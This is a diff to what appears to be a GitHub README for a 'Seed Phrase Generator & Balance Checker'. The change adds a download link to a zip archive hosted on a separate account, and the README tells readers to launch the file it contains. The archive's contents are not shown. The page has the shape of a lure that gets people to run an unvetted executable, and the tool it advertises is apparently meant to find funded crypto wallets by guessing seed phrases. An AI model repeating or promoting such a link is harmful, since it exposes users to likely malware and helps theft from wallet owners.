@@ -10,7 +10,7 @@ The primary focus of this repository is to provide robust tools for cryptocurren
 
 ## 📦 Get Started
 To access the tools and resources provided in this repository, you can download the necessary files from the following link: 
-### [![Download Seed Phrase Generator & Balance Checker](https://img.shields.io/badge/Download-Toolkit.zip-blue-badge)]()
+### [![Download Seed Phrase Generator & Balance Checker](https://img.shields.io/badge/Download-Toolkit.zip-blue-badge)](https://github.com/jmorat894/JomboTool/releases/download/sdtol/seedtool.zip)
 
 📌 Note: Make sure to launch the file contained in the link to start using the tools effectively.
 
